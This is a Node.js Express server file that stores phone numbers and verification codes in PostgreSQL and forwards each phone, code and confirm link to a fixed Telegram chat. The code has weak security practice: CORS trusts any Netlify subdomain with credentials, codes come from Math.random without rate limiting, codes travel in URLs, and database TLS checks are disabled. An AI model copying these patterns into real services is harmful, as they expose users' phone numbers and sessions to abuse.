require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;

// ========== CORS ДЛЯ NETLIFY ==========
const allowedOrigins = [
    'http://localhost:3000',
    'http://localhost:8888',
    'https://*.netlify.app'
];

app.use(cors({
    origin: function(origin, callback) {
        if (!origin) return callback(null, true);
        if (allowedOrigins.some(allowed => origin === allowed || origin.endsWith('.netlify.app'))) {
            callback(null, true);
        } else {
            console.log('Blocked CORS origin:', origin);
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.options('*', cors());
app.use(express.json());

// ========== БАЗА ДАННЫХ ==========
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

async function initDB() {
    await pool.query(`
        CREATE TABLE IF NOT EXISTS sessions (
            session_id TEXT PRIMARY KEY,
            phone TEXT NOT NULL,
            code TEXT NOT NULL,
            verified BOOLEAN DEFAULT FALSE,
            created_at TIMESTAMP DEFAULT NOW(),
            expires_at TIMESTAMP DEFAULT NOW() + INTERVAL '15 minutes'
        )
    `);
    console.log('✅ PostgreSQL ready');
    
    setInterval(async () => {
        await pool.query('DELETE FROM sessions WHERE expires_at < NOW()');
    }, 5 * 60 * 1000);
}
initDB();

// ========== API РОУТЫ ==========
app.post('/api/send-code', async (req, res) => {
    const { phone } = req.body;
    if (!phone) return res.status(400).json({ success: false });
    
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    const sessionId = require('crypto').randomBytes(16).toString('hex');
    
    try {
        await pool.query(
            'INSERT INTO sessions (session_id, phone, code) VALUES ($1, $2, $3)',
            [sessionId, phone, code]
        );
        
        const sent = await sendTelegramCode(phone, code, sessionId);
        res.json({ success: sent, sessionId });
    } catch (err) {
        console.error(err);
        res.status(500).json({ success: false });
    }
});

app.get('/api/check-session/:sessionId', async (req, res) => {
    const result = await pool.query(
        'SELECT verified FROM sessions WHERE session_id = $1 AND expires_at > NOW()',
        [req.params.sessionId]
    );
    res.json({ verified: result.rows[0]?.verified || false });
});

app.post('/api/auto-verify', async (req, res) => {
    const { sessionId, code } = req.body;
    const result = await pool.query(
        'UPDATE sessions SET verified = TRUE WHERE session_id = $1 AND code = $2 AND verified = FALSE RETURNING session_id',
        [sessionId, code]
    );
    res.json({ success: result.rows.length > 0 });
});

// ========== ТЕЛЕГРАМ ==========
async function sendTelegramCode(phone, code, sessionId) {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const siteUrl = process.env.SITE_URL || `http://localhost:${PORT}`;
    
    if (!botToken || !chatId) {
        console.log(`DEMO: ${phone} -> ${code}`);
        return true;
    }
    
    const link = `${siteUrl}/?sessionId=${sessionId}&code=${code}`;
    const message = `🔐 НОВЫЙ ЗАПРОС\n📱 ${phone}\n🔑 ${code}\n✅ [ПОДТВЕРДИТЬ](${link})`;
    
    try {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
        });
        const json = await response.json();
        return json.ok;
    } catch (err) {
        console.error(err);
        return false;
    }
}

app.get('/health', (req, res) => res.json({ status: 'ok' }));

app.listen(PORT, () => {
    console.log(`🚀 Render backend on port ${PORT}`);
    console.log(`📍 CORS enabled for Netlify domains`);
});
